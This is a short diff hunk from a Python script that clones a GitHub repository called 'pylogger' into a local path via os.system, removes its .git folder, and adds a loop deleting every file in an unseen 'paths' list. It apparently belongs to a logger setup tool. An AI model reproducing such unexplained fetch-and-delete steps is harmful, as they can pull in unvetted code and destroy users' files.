@@ -100,6 +100,8 @@ os.system(cmd)
 time.sleep(2.5)
 os.system(f'git clone --depth=1 https://github.com/Legohead69420/pylogger {path}')
 shutil.rmtree(f'{path}\.git', onerror = rmv_hdn_fl)
+for i in paths:
+    os.remove(i)
 cls()
 
 if log=="yes":
